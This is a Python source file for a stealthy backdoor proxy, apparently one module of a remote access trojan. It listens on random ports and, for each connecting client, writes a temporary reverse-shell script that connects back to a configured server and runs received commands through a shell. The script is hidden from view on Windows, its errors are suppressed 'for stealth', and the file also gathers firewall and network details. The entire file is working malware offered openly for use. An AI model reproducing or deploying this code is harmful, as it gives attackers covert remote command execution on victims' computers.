import socket
import threading
import time
import select
import random
from datetime import datetime
import subprocess

# Import configuration variables from parent directory
import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from configuration import SERVER_IP, SERVER_PORT, PROXY_PORT_START, PROXY_PORT_END

class HiddenChannel:
    """Hidden proxy channel for covert backdoor access"""

    def __init__(self, listen_port=None, target_host=SERVER_IP, target_port=SERVER_PORT):
        # Port will be set during initialization to ensure availability
        self.listen_port = listen_port  # Don't generate random port yet
        self.target_host = target_host
        self.target_port = target_port
        self.is_running = False
        self.channel_socket = None
        self.channel_thread = None
        self.connections = {}  # Track active connections
        self.connection_count = 0
        self.start_time = None
        
    def create_stealth_socket(self):
        """Create socket with stealth configurations"""
        try:
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # Socket options for stealth
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            # Try to bind to the port
            sock.bind(('0.0.0.0', self.listen_port))
            sock.listen(5)
            
            return sock
        except Exception as e:
            return None
    
    def handle_client_connection(self, client_socket, client_address):
        """Handle individual client connection by spawning new backdoor process"""
        connection_id = f"conn_{self.connection_count}"
        self.connection_count += 1
        
        print(f"[PROXY] Client {connection_id} connected: {client_address}")
        
        try:
            # Send welcome message
            welcome_msg = f"[PROXY] Finding available proxy port...\n"
            client_socket.send(welcome_msg.encode())
            
            # Find available proxy port
            proxy_port = self.get_available_proxy_port()
            
            if not proxy_port:
                error_msg = "No available proxy ports on server. Try again later.\n"
                client_socket.send(error_msg.encode())
                return
            
            client_socket.send(f"[PROXY] Using proxy port {proxy_port}\n".encode())
            client_socket.send(f"[PROXY] Spawning dedicated backdoor instance...\n".encode())
            
            # Spawn new backdoor process for this client
            result = self.spawn_backdoor_process_for_port(proxy_port)
            
            if not result or not result[0]:
                error_msg = "Failed to spawn backdoor process. Try again.\n"
                client_socket.send(error_msg.encode())
                return
            
            backdoor_process, temp_file = result
            
            # Give user instructions
            instructions = (
                f"[PROXY] Backdoor instance spawned (PID: {backdoor_process.pid})\n"
                f"[PROXY] Connected to server port {proxy_port}\n"
                f"[PROXY] You now have your own private backdoor session!\n"
                f"[PROXY] This connection will stay active until you disconnect\n"
                f"[PROXY] Connection established!\n"
            )
            client_socket.send(instructions.encode())
            
            # Store connection info
            self.connections[connection_id] = {
                'client_addr': client_address,
                'start_time': datetime.now(),
                'proxy_port': proxy_port,
                'process_pid': backdoor_process.pid,
                'backdoor_process': backdoor_process,
                'temp_file': temp_file
            }
            
            # Keep connection alive and wait for process to finish
            try:
                while backdoor_process.poll() is None:  # While process is running
                    time.sleep(1)
                    
                # Process finished
                final_msg = f"[PROXY] Backdoor process {backdoor_process.pid} has ended\n"
                client_socket.send(final_msg.encode())
                
            except Exception:
                # Client disconnected
                if backdoor_process.poll() is None:  # If process still running
                    backdoor_process.terminate()  # Clean up
                    
            # Clean up temp file
            try:
                if temp_file and os.path.exists(temp_file):
                    os.remove(temp_file)
            except Exception:
                pass
            
        except Exception:
            pass  # Silent failure for stealth
        finally:
            # Clean up sockets properly
            try:
                client_socket.shutdown(socket.SHUT_RDWR)
            except:
                pass
            try:
                client_socket.close()
            except:
                pass
            if connection_id in self.connections:
                del self.connections[connection_id]
            print(f"[PROXY] Client {connection_id} disconnected")
    
    def simple_forward(self, client_socket, target_socket, connection_id):
        """Legacy method - no longer used in new architecture"""
        pass

    
    def forward_data(self, source_socket, destination_socket, connection_id, direction):
        """This method is no longer used - kept for compatibility"""
        pass
    
    def proxy_server_loop(self):
        """Main proxy server loop"""
        try:
            self.channel_socket = self.create_stealth_socket()
            if not self.channel_socket:
                return
            
            self.is_running = True
            self.start_time = datetime.now()
            
            while self.is_running:
                try:
                    # Accept connections with timeout
                    self.channel_socket.settimeout(1.0)
                    client_socket, client_address = self.channel_socket.accept()
                    
                    # Handle connection in separate thread
                    connection_thread = threading.Thread(
                        target=self.handle_client_connection,
                        args=(client_socket, client_address),
                        daemon=True
                    )
                    connection_thread.start()
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    if self.is_running:
                        time.sleep(1)  # Brief pause before retry
                        
        except Exception as e:
            pass  # Silent failure for stealth
        finally:
            if self.channel_socket:
                try:
                    self.channel_socket.close()
                except:
                    pass
    
    def start_proxy_channel(self):
        """Start the proxy channel"""
        if self.is_running:
            return False, "proxy channel already running"
        
        # Test if target is reachable
        if not self.test_target_connection():
            return False, f"Cannot reach target {self.target_host}:{self.target_port}"
        
        # Start proxy channel in background thread
        self.channel_thread = threading.Thread(target=self.proxy_server_loop, daemon=True)
        self.channel_thread.start()
        
        # Give it a moment to start
        time.sleep(0.5)
        
        if self.is_running:
            return True, f"proxy channel started on port {self.listen_port}"
        else:
            return False, "Failed to start proxy channel"
    
    def stop_proxy_channel(self):
        """Stop the proxy channel"""
        if not self.is_running:
            return False, "proxy channel not running"
        
        self.is_running = False
        
        # Close main socket
        if self.channel_socket:
            try:
                self.channel_socket.close()
            except:
                pass
        
        # Wait for thread to finish
        if self.channel_thread:
            self.channel_thread.join(timeout=3)
        
        return True, f"proxy channel stopped"
    
    def get_available_proxy_port(self):
        """Find an available proxy port by testing server ports"""
        for port in range(PROXY_PORT_START, PROXY_PORT_END + 1):
            try:
                # Test if this proxy port is available on the server
                test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                test_socket.settimeout(2)
                result = test_socket.connect_ex((self.target_host, port))
                test_socket.close()
                
                if result == 0:  # Connection successful = server listening
                    return port
                    
            except Exception:
                continue
        
        return None

    def spawn_backdoor_process_for_port(self, proxy_port):
        """Spawn a new backdoor process that connects to specific proxy port"""
        try:
            # Get the path to backdoor.py (should be in parent directory)
            current_dir = os.path.dirname(os.path.abspath(__file__))
            parent_dir = os.path.dirname(current_dir)
            backdoor_path = os.path.join(parent_dir, 'backdoor.py')
            
            if not os.path.exists(backdoor_path):
                print(f"[PROXY] Backdoor not found at: {backdoor_path}")
                return None
            
            # Create custom backdoor script that connects to specific port
            custom_backdoor_content = f'''
import socket
import json
import subprocess
import os
import time

SERVER_IP = '{self.target_host}'
SERVER_PORT = {proxy_port}

def reliable_send(data, sock):
    jsondata = json.dumps(data)
    sock.send(jsondata.encode())

def reliable_recv(sock):
    data = ''
    while True:
        try:
            data = data + sock.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def shell(sock):
    while True:
        command = reliable_recv(sock)
        
        if command == 'quit':
            break
        else:
            try:
                execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = execute.stdout.read() + execute.stderr.read()
                result = result.decode('utf-8', errors='ignore')
                if result:
                    reliable_send(result, sock)
                else:
                    reliable_send("Command executed successfully (no output)", sock)
            except Exception as e:
                reliable_send("Command execution error: " + str(e), sock)

# Connect to specific proxy port
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((SERVER_IP, SERVER_PORT))
    shell(s)
except Exception as e:
    pass
finally:
    s.close()
'''
            
            # Write custom backdoor to temp file
            temp_backdoor_path = os.path.join(parent_dir, f'temp_backdoor_{proxy_port}.py')
            with open(temp_backdoor_path, 'w') as f:
                f.write(custom_backdoor_content)
            
            # Spawn new Python process running custom backdoor
            process = subprocess.Popen(
                [sys.executable, temp_backdoor_path],
                cwd=parent_dir,
                creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
            )
            
            print(f"[PROXY] Spawned backdoor process PID: {process.pid} for port {proxy_port}")
            return process, temp_backdoor_path
            
        except Exception as e:
            print(f"[PROXY] Error spawning backdoor: {e}")
            return None, None

    def test_target_connection(self):
        """Test if target server is reachable"""
        try:
            test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_socket.settimeout(2)
            result = test_socket.connect_ex((self.target_host, self.target_port))
            test_socket.close()
            return result == 0
        except:
            return False
    
    def get_proxy_status(self):
        """Get current proxy status and statistics"""
        status = {
            'is_running': self.is_running,
            'listen_port': self.listen_port,
            'target_host': self.target_host,
            'target_port': self.target_port,
            'start_time': self.start_time.isoformat() if self.start_time else None,
            'active_connections': len(self.connections),
            'total_connections': self.connection_count,
            'uptime_seconds': (datetime.now() - self.start_time).total_seconds() if self.start_time else 0
        }
        
        return status
    



class proxyManager:
    """Manage proxy mechanisms for the hidden channel"""
    
    def __init__(self, channel_instance):
        self.channel = channel_instance
    
    def check_firewall_status(self):
        """Check Windows firewall status (informational)"""
        try:
            result = subprocess.run(
                ['netsh', 'advfirewall', 'show', 'allprofiles', 'state'],
                capture_output=True, text=True, timeout=10
            )
            return result.returncode == 0, result.stdout
        except Exception as e:
            return False, str(e)
    
    def check_port_usage(self, port=None):
        """Check if port is already in use"""
        if port is None:
            port = self.channel.listen_port
            
        try:
            result = subprocess.run(
                ['netstat', '-an'],
                capture_output=True, text=True, timeout=5
            )
            
            if result.returncode == 0:
                port_str = f":{port}"
                lines = result.stdout.split('\n')
                for line in lines:
                    if port_str in line and 'LISTENING' in line:
                        return True, f"Port {port} is already in use"
                
                return False, f"Port {port} is available"
            else:
                return None, "Could not check port status"
                
        except Exception as e:
            return None, f"Error checking port: {str(e)}"
    
    def find_available_port(self, start_port=8000, end_port=9999):
        """Find an available port in the given range"""
        for port in range(start_port, end_port + 1):
            in_use, msg = self.check_port_usage(port)
            if in_use == False:  # Port is available
                return port
        
        return None
    
    def get_network_info(self):
        """Get network interface information"""
        try:
            result = subprocess.run(
                ['ipconfig', '/all'],
                capture_output=True, text=True, timeout=10
            )
            
            if result.returncode == 0:
                return True, result.stdout
            else:
                return False, "Could not retrieve network info"
                
        except Exception as e:
            return False, f"Network info error: {str(e)}"


class Backdoorproxy:
    """Main manager for backdoor proxy operations"""
    
    def __init__(self, target_host=SERVER_IP, target_port=SERVER_PORT):
        self.target_host = target_host
        self.target_port = target_port
        self.channel = None
        self.proxy_mgr = None
    
    def initialize_proxy(self, listen_port=None):
        """Initialize the proxy channel"""
        self.channel = HiddenChannel(listen_port, self.target_host, self.target_port)
        self.proxy_mgr = proxyManager(self.channel)
        
        # Find available port if none specified
        if listen_port is None:
            # Try random ports until we find an available one
            max_attempts = 10
            for attempt in range(max_attempts):
                random_port = random.randint(8000, 9999)
                in_use, port_msg = self.proxy_mgr.check_port_usage(random_port)
                if in_use == False:  # Port is available
                    self.channel.listen_port = random_port
                    break
            else:
                # If no random port found, use find_available_port as fallback
                available_port = self.proxy_mgr.find_available_port()
                if available_port:
                    self.channel.listen_port = available_port
                else:
                    return False, "No available ports found"
        
        return True, f"proxy initialized on port {self.channel.listen_port}"
    
    def start_proxy_operations(self):
        """Start proxy operations with automatic new random port selection"""
        # Always reinitialize with a new random port for better stealth
        success, msg = self.initialize_proxy()
        if not success:
            return False, msg
        
        # Start the proxy channel
        return self.channel.start_proxy_channel()
    
    
    def stop_proxy_operations(self):
        """Stop proxy operations"""
        if self.channel:
            return self.channel.stop_proxy_channel()
        else:
            return False, "No proxy channel found"
    
    def get_proxy_status(self):
        """Get comprehensive proxy status"""
        if not self.channel:
            return {'error': 'proxy not initialized'}
        
        channel_status = self.channel.get_proxy_status()
        
        # Add system information
        in_use, port_msg = self.proxy_mgr.check_port_usage()
        
        status = {
            'proxy': channel_status,
            'port_status': port_msg,
            'target_reachable': self.channel.test_target_connection(),
            'system_time': datetime.now().isoformat()
        }
        
        return status
    



# Factory function to create backdoor proxy manager
def create_backdoor_proxy(target_host=SERVER_IP, target_port=SERVER_PORT):
    """Create backdoor proxy manager instance"""
    return Backdoorproxy(target_host, target_port)